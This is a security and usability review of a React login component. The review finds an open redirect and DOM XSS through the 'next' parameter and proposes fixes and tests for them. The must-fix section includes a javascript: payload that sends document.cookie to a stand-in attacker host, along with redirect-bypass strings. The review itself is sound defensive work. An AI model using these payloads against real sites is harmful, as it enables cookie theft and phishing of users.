## Login review: `src/Login.tsx`

**Result: Fail.** One confirmed security flaw and one misleading-feedback bug must be fixed. The rest of the component is a reasonable starting point. I only read the code. The repo has no `package.json`, styles or backend, so nothing was run.

### Must-fix

**1. The `next` parameter allows redirects to other sites and running attacker scripts (DOM XSS)**
Evidence: `src/Login.tsx:12-13`. The `next` value is copied straight into `window.location.href`.
Impact:
- `/login?next=https://evil.example` sends the user to an attacker's site right after a real login. A fake "session expired, sign in again" page there is a convincing way to steal their password.
- `/login?next=javascript:fetch('//evil.example?c='+document.cookie)` runs attacker code on your site just after the session is created, and the user is logged in when it runs.
- `//evil.example` and `/\evil.example` get past a naive "starts with `/`" check.

Fix: resolve the value against the current origin and only allow same-origin paths:
```ts
function safeNext(raw: string | null): string {
  if (!raw) return "/home";
  try {
    const url = new URL(raw, window.location.origin);
    if (url.origin !== window.location.origin) return "/home";
    return url.pathname + url.search + url.hash;
  } catch {
    return "/home";
  }
}
```
Verify: `next=https://evil.example`, `next=//evil.example`, `next=/\evil.example` and `next=javascript:alert(1)` should all land on `/home`, while `next=/settings?tab=2` should still work.

**2. Every failure says "Email or password is incorrect," and network errors show nothing**
Evidence: `:10-11`. Any non-OK response gets the wrong-password message, including 429 (rate limited, locked out) and 500/503 (server down). If `fetch` throws (offline, DNS, CORS), the promise rejection is never handled. No error appears and the form looks like it did nothing.
Impact: users type their correct password again and again while locked out or during an outage. That can make a lockout worse and fills your support queue.
Fix: wrap the request in `try/catch`. Keep the current message for 400/401, show "Too many attempts, try again in a few minutes" for 429, and "We couldn't reach the server. Check your connection and try again" for server and network errors.
Verify: mock each status and a rejected fetch, and check that each one shows its own message.

### Should-fix

3. **No pending state** (`:8-14`, `:23`). The button stays enabled and gives no feedback while the request runs. Double-clicks or pressing Enter twice send duplicate logins, which counts double against rate limits. Add a `submitting` flag: disable the button, change its label to "Signing in…", and ignore new submits until the request finishes.
4. **Screen readers don't re-announce a repeated error** (`:22`). The error is never cleared, so a second failed attempt puts the same text in the same `role="alert"` node and nothing is announced. Call `setError("")` at the start of `submit`. Also add `aria-invalid` and `aria-describedby` pointing at the error on both inputs.
5. **No `required` on the inputs** (`:19`, `:21`). Empty submits go to the server and come back as "incorrect password," which is misleading. Add `required` to get native validation.
6. **Pre-hydration submits (a caution, not a bug today).** The form has no `method` or `action`. Because the inputs have no `name`, a submit before JS loads sends nothing. If someone later adds `name` attributes for password-manager support without also adding `method="post"`, the password ends up in the URL and in browser history. Add `method="post"` now so that can't happen.
